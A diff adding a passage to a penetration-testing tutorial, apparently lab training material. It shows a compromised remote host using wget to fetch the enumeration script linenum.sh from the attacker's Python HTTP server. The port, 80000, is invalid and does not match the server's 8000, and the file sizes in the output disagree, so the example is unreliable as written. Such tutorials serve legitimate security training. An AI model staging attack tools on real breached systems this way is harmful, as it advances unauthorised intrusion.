@@ -14,3 +14,16 @@ kieferhax@htb[/htb]$ python3 -m http.server 8000
 
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
 ```
+
+Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:
+
+```
+user@remotehost$ wget http://10.10.14.1:80000/linenum.sh
+
+...SNIP...
+Saving to: 'linenum.sh'
+
+linenum.sh 100%[=======================>] 144.86K --.-KB/s in 0.02s
+
+2021-02-08 18:09:19 (8.16 MD/s) - 'linenum.sh' saved [14337/14337]
+```
